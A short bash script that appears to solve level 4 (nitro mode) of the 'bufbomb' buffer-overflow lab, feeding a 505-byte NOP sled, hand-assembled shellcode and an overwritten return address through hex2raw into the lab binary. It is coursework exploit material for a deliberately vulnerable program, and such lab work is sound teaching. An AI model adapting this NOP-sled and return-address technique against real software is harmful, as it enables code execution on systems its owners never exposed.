#!/bin/bash

x=505
while [ "$x" -le 505 ]; do
    echo "x is $x"
    perl -e "print '90 'x$x, 'b8 31 dd eb 60 8d 6c 24 28 68 67 8c 04 08 c3 ', '30 31 32 33 ', '98 32 68 55' " > hexlevel4
    cat hexlevel4 | ./hex2raw -n | ./bufbomb -n -u s20145071
    x=$(expr $x + 1)
done
